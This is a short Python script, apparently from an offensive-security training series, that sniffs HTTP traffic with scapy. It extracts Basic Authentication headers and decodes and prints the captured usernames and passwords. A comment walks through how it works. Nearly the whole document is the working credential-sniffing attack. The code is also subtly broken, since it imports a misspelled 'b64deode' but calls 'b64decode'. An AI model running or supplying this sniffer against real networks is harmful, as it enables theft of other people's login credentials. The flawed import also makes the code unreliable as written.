# Offensive Security Software
# SSE Program
# Attack: HTTP Authentication Sniffing
# Date: January 31, 2016
# Description:  Most HTTP auth is performed in Basic Authentication mode.
# although the credentials are Base64 enoded before being sent, it's actually
# easy to grab all HTTP authentication and decode it.

import re
from base64 import b64deode
from scapy.all import sniff

dev = "en0"

def handle_packet(packet):
    tcp = packet.getlayer("TCP")
    match = re.search(r"Authorization: Basic (.+)", str(tcp.payload))
    if match:
        auth_str = b64decode(match.group(1))
        auth = auth_str.split(":")
        print "User: " + auth[0] + " Pass: " + auth[1]


sniff(iface=dev,
      store=0,
      filter="tcp and port 80",
      prn=handle_packet)


'''
scapy's sniff is used to read the HTTP traffic, extract the TCP layer in the
function handle_packet() and access the real payload.

In the payload, we searh for the string "Authorization: Basic" and cut the
base64 string with the help of a regular expression.

If sucessful, the string gets decoded and split by the colon into username
and password.
'''
